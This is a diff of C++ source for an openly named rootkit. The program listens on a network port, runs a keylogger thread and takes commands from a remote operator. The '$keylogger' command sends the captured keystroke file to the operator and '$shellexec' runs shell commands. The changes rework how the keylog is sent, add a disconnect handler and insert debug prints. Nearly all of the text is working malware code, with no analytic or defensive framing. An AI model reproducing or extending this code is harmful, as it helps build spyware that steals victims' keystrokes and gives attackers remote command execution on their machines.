@@ -7,17 +7,15 @@ static void handle_request(network::rootkit& client);
 //general setup
 int main()
 {
-	
 	network::rootkit network_client(9001);
-	
-	
+	std::cout << "test\n";
 	std::thread keylogger(logger::logger_subroutine);
 
 	handle_request(network_client);
 
 	logger::thread_running = false;
 	keylogger.join();
-	
+
 	return 0;
 }
 
@@ -37,9 +35,8 @@ static void handle_request(network::rootkit& client)
 		}
 		else if (buffer.rfind("$keylogger", 0) == 0)
 		{
-			buffer = buffer.substr(buffer.find(" ")+1);
-			std::string tmp = read_file(logger::path);
-			client.send_text(tmp);
+			if (!(client.send_all_f(logger::path)))
+				std::cout << "[-]Unable to retrieve keylogs" << std::endl;
 		}
 		else if (buffer.rfind("$shellexec", 0) == 0)
 		{
@@ -49,9 +46,10 @@ static void handle_request(network::rootkit& client)
 			client.send_text(tmp);
 		}
 		// default action is to just execute shell commands
-		else
+		else if (buffer == "DISCONNECT")
 		{
-			std::cout << "Unrecognized command\n";
+			std::cout << "disconnect\n";
+			closesocket(client.socket_fd);
 		}
 	}
 }
